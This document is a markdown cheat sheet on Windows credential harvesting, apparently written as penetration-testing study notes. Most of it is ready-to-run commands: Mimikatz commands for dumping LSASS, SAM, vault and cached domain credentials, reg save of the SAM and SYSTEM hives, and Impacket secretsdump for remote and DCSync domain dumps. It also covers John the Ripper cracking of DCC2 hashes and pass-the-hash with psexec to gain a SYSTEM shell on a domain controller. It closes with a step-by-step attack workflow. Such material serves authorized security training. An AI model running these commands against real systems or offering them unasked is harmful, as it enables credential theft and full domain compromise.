# Intro to Credential Harvesting 
## 1. Windows Credential Stores

|Store|Contains|Requirement / Method|
|---|---|---|
|**LSASS**|Logon credentials, NTLM material, Kerberos tickets|Administrator/SYSTEM; inspect process memory|
|**SAM + SYSTEM**|Local account password hashes|Export both registry hives|
|**LSA Secrets**|Service-account secrets and other system-managed secrets|Elevated privileges; specialized tools|
|**DPAPI / Vault**|Saved application, Windows, and web credentials|User context, master keys, or relevant credentials|
|**NTDS.dit**|AD accounts, password hashes, Kerberos key material|DC access or authorized directory replication rights|

Paths to remember:

```text
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
HKLM\SECURITY\Policy\Secrets
%APPDATA%\Microsoft\Protect
```

## 2. Mimikatz — DPAPI / Vault

**List available vaults**

```text
vault::list
```

**Export stored credentials**

```text
vault::cred /export
```

Credentials protected by another user's DPAPI keys may remain unreadable unless the required user context, password, or keys are available.

## 3. Dump Local SAM Hashes

Run in an elevated PowerShell session.

**Save registry hives**

```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

**Extract local hashes with Mimikatz**

```text
lsadump::sam /sam:"C:\Temp\SAM" /system:"C:\Temp\SYSTEM"
```

**Why:** The SAM contains local account hashes; the SYSTEM hive provides key material needed to recover them.

## 4. Extract LSASS Credentials

Run Mimikatz with sufficient privileges.

```text
privilege::debug
sekurlsa::logonpasswords
```

- `privilege::debug` — enables the debug privilege when available.
    
- `sekurlsa::logonpasswords` — examines LSASS authentication data.
    

**Look for:** Usernames, domains, NTLM hashes, Kerberos tickets, and any credentials available in memory.

**Gotcha:** Only credentials still present in accessible logon sessions can be recovered. Previously logged-in users may no longer have reusable credentials in LSASS.

## 5. Extract Cached Domain Credentials

**Mimikatz**

```text
privilege::debug
token::elevate
lsadump::cache
```

- `token::elevate` — attempts to obtain a SYSTEM token.
    
- `lsadump::cache` — displays cached domain logon hashes, commonly MSCacheV2/DCC2.
    

Cached domain hashes support offline cracking; **DCC2 hashes cannot be used directly for Pass-the-Hash**.

## 6. Remote Credential Extraction — Impacket

### A. Local Administrator Access

```bash
secretsdump.py 'HOST/Administrator:PASSWORD'@TARGET_IP \
-outputfile local_dump
```

May retrieve:

- Local SAM hashes.
    
- Cached domain logon hashes.
    
- LSA secrets, depending on access and system configuration.
    

### B. Crack DCC2 Hashes

DCC2 format:

```text
$DCC2$10240#USERNAME#HASH
```

**John the Ripper**

```bash
john --format=mscash2 dc2_hash.txt \
--wordlist=/usr/share/wordlists/rockyou.txt
```

Show recovered passwords:

```bash
john --show --format=mscash2 dc2_hash.txt
```

**Why:** DCC2 hashes can be cracked offline, but cannot be passed directly to NTLM authentication tools.

## 7. Domain Credential Extraction — DCSync

**Requirement:** Credentials with the directory replication permissions needed to perform the operation, often held by Domain Admins or similarly privileged accounts.

```bash
secretsdump.py 'DOMAIN/USER:PASSWORD'@DC_IP \
-just-dc -outputfile dc_dump
```

`-just-dc` retrieves domain credential material through the DRSUAPI replication method rather than dumping the target's local SAM.

Output can include:

- Domain users' NTLM hashes.
    
- Computer-account hashes.
    
- Kerberos key material, where available.
    

**Why it matters:** Replication rights can expose credentials across the domain without requiring direct access to the NTDS.dit file.

## 8. Pass-the-Hash to a Domain Controller

If a valid privileged NTLM hash is obtained, it may be usable without cracking the plaintext password.

**Impacket PsExec**

```bash
psexec.py 'DOMAIN/Administrator@DC_IP' \
-hashes :NTLM_HASH
```

- `-hashes` — supplies `LM_HASH:NT_HASH`.
    
- An empty LM hash can be represented by leaving the value before the colon blank.
    
- PsExec attempts remote execution through SMB and the Service Control Manager; adequate privileges and reachable services are required.
    

A successful privileged execution may return a shell running as `NT AUTHORITY\SYSTEM`.

## Core Workflow

**Inspect DPAPI/Vault → Check LSASS → Export SAM + SYSTEM → Examine cached credentials → Crack DCC2 offline → Check replication privileges → Extract domain hashes → Validate privileged access.**
